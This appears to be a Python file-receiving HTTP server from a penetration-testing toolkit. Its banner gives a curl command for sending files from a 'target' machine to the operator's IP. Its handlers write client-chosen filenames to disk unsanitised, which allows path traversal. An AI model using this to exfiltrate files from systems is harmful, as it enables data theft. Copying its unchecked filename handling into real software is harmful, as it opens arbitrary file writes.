import argparse
import os
import socketserver
import http.server
import base64
import logging
import sys
import datetime
import re



# Configure logging
logging.basicConfig(level=logging.INFO, format='%(levelname)s: %(message)s')

class CustomRequestHandler(http.server.SimpleHTTPRequestHandler):
    def do_GET(self):
        # Check if the custom header "X-Base64-Data" is present in the request
        if "X-Base64-Data" in self.headers:
            base64_data = self.headers["X-Base64-Data"];
            f_name = self.headers["X-FName"];
            print(f_name)
            try:
                decoded_data = base64.b64decode(base64_data)
                
                # Save the decoded data to a file in the output directory
                if self.server.output_dir:
                    with open(os.path.join(self.server.output_dir, f_name), "wb") as f:
                        f.write(decoded_data)
                        print(f"Saved to {os.path.join(self.server.output_dir, f_name)}")
                
                # Respond with a success message
                response_message = "Decryption successful. Hello, world!"
                self.send_response(200)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(response_message.encode("utf-8"))
            except Exception as e:
                # Log the error and respond with an error message
                logging.error(f"Error decoding base64 data: {str(e)}")
                response_message = "Error decoding base64 data."
                self.send_response(400)
                self.send_header("Content-type", "text/html")
                self.end_headers()
                self.wfile.write(response_message.encode("utf-8"))
        else:
            # If the custom header is not present, serve files as usual
            super().do_GET()

    def do_POST(self):

        content_length = int(self.headers["Content-Length"]);
        file_content = self.rfile.read(content_length);
        #print(self.headers)
        
        if 'Expect' in self.headers and self.headers['Expect'] == '100-continue':
            self.send_response(100)
            self.end_headers()


        content_disposition = self.headers.get('Content-Disposition') or "";

        match = re.search(r'filename="(.+)"', content_disposition)
        
        if match:
            filename = match.group(1)
        else:
            filename = datetime.datetime.now().strftime("%m_%d_%Y_%H_%M_%S")

        if self.server.output_dir:
            with open(os.path.join(self.server.output_dir, filename), "wb") as f:
                f.write(file_content)
            
            self.send_response(200)
            self.end_headers()
            self.wfile.write(b'<h1>Good Response! </h1>\n');
            
            print(f"Saved file to {os.path.join(self.server.output_dir,filename)}");



class CustomHTTPServer(socketserver.TCPServer):
    def __init__(self, server_address, RequestHandlerClass, output_dir=None):
        self.output_dir = output_dir
        super().__init__(server_address, RequestHandlerClass)

def main():
    parser = argparse.ArgumentParser(description="HTTP Server to allow for simple file transfer")

    parser.add_argument(
        "-l",
        "--listen-host",
        default="0.0.0.0",
        help="The address to bind to (default: 0.0.0.0)",
    )

    parser.add_argument(
        "-p",
        "--port",
        type=int,
        default=80,
        help="The port to listen on (default: 80)",
    )

    parser.add_argument(
        "-o",
        "--output-dir",
        default=os.getcwd(),
        help="The output directory (default: working directory)",
    )

    args = parser.parse_args()

    listen_host = args.listen_host
    port = args.port
    output_dir = args.output_dir

    if not os.path.exists(output_dir):
        print(f"Error: The output directory '{output_dir}' does not exist.")
        sys.exit(1)

    #os.chdir(output_dir)
    output_dir= os.path.join(os.getcwd(),output_dir);

    try:
        server = CustomHTTPServer(
            (listen_host, port),
            CustomRequestHandler,
            output_dir=output_dir,
        )

        output =  "==========================[SERVER IS UP]========================\n";
        output += "|                                                              |\n";
        output += "| Server is listening on {listen_host}:{port}...               |\n";
        output += "| To send data use HTTP-Client.py on the target                |\n";
        output += "| Or use `curl http://<YOUR-IP>/ --data-binary @/path/to/file  |\n";
        output += "|                                                              |\n";
        output += "================================================================\n";
        #print(f"Server is listening on {listen_host}:{port}...");
        #print(f"Use HTTP-Client.py to send data from the host\n or use\n curl http://<YOUR-IP>/ --data-binary @/path/to/file");
        print(output);
        server.serve_forever()
    except KeyboardInterrupt:
        print("\nServer stopped.")
    finally:
            try:
                server.server_close()
            except:
                pass
if __name__ == "__main__":
    main()
